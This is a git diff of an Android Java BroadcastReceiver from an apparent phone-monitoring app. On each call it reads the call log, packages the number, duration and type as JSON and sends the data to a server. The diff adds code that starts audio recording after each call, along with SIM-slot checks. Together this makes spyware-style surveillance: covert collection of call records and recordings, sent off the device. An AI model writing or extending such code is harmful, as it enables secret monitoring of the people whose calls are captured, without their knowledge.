@@ -10,12 +10,13 @@ import android.content.Context;
 import android.content.Intent;
 import android.content.SharedPreferences;
 import android.database.Cursor;
+import android.os.Bundle;
 import android.preference.PreferenceManager;
 import android.provider.CallLog;
 import android.telephony.TelephonyManager;
 
-import com.inet.android.request.DataRequest;
-import com.inet.android.request.SendFilesTest;
+import com.inet.android.audio.RecordAudio;
+import com.inet.android.request.RequestList;
 import com.inet.android.utils.ConvertDate;
 import com.inet.android.utils.Logging;
 import com.inet.android.utils.WorkTimeDefiner;
@@ -27,14 +28,13 @@ import com.inet.android.utils.WorkTimeDefiner;
  * 
  */
 public class CallReceiver extends BroadcastReceiver {
-	private Context ctx;
+	private Context mContext;
 	private SharedPreferences sp;
-	private static String LOG_TAG = "callReceiver";
+	private static String LOG_TAG = CallReceiver.class.getSimpleName().toString();
 	@Override
 	public void onReceive(Context arg0, Intent intent) {
 		sp = PreferenceManager.getDefaultSharedPreferences(arg0);
 		String call = sp.getString("call", "0");
-
 		if (call.equals("0")) {
 			Logging.doLog(LOG_TAG, "call : 0", "call : 0");
 			return;
@@ -49,8 +49,19 @@ public class CallReceiver extends BroadcastReceiver {
 					"isWork - " + Boolean.toString(isWork));
 		}
 
-		ctx = arg0;
-
+		mContext = arg0;
+		  Bundle bundle = intent.getExtras();
+		  String   callingSIM =String.valueOf(bundle.getInt("simId", -1));
+		    if(callingSIM == "0"){
+		        // Incoming call from SIM1 
+		    	Logging.doLog(LOG_TAG, "sim1",
+						"sim1");
+		    } 
+		    else if(callingSIM =="1"){
+		        // Incoming call from SIM2 
+		    	Logging.doLog(LOG_TAG, "sim2",
+						"sim2");
+		    } 
 		if (intent.getAction()
 				.equals("android.intent.action.NEW_OUTGOING_CALL")) {
 			// получаем исходящий номер
@@ -90,7 +101,7 @@ public class CallReceiver extends BroadcastReceiver {
 
 	private void getCallDetails() {
 
-		Cursor managedCursor = ctx.getContentResolver().query(
+		Cursor managedCursor = mContext.getContentResolver().query(
 				CallLog.Calls.CONTENT_URI, null, null, null, null);
 
 		int number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER);
@@ -101,10 +112,8 @@ public class CallReceiver extends BroadcastReceiver {
 		String phNumber = managedCursor.getString(number);
 		String callType = managedCursor.getString(type);
 		String callDuration = managedCursor.getString(duration);
-		// if (Integer.parseInt(callDuration) < 30) {
-		// callDuration = "5";
-		// }
 		String callTypeStr = null;
+		
 		int dircode = Integer.parseInt(callType);
 
 		switch (dircode) {
@@ -126,14 +135,13 @@ public class CallReceiver extends BroadcastReceiver {
 		String sendJSONStr = null;
 		JSONObject info = new JSONObject();
 		JSONObject object = new JSONObject();
-		ConvertDate getDate = new ConvertDate();
 		
 		try {
 
 			info.put("number", phNumber);
 			info.put("duration", callDuration);
 
-			object.put("time", getDate.logTime());
+			object.put("time", ConvertDate.logTime());
 			object.put("type", callTypeStr);
 			object.put("info", info);
 			// sendJSONStr = jsonObject.toString();
@@ -143,10 +151,8 @@ public class CallReceiver extends BroadcastReceiver {
 		}
 
 		Logging.doLog(LOG_TAG, sendJSONStr);
-
-		DataRequest dr = new DataRequest(ctx);
-		dr.sendRequest(sendJSONStr);
-//		SendFilesTest sfT = new SendFilesTest(ctx);
-//		sfT.sendTest();
+		RecordAudio recordAudio = new RecordAudio(mContext, 1);
+		recordAudio.executeRecording();
+		RequestList.sendDataRequest(sendJSONStr, mContext);
 	}
 }
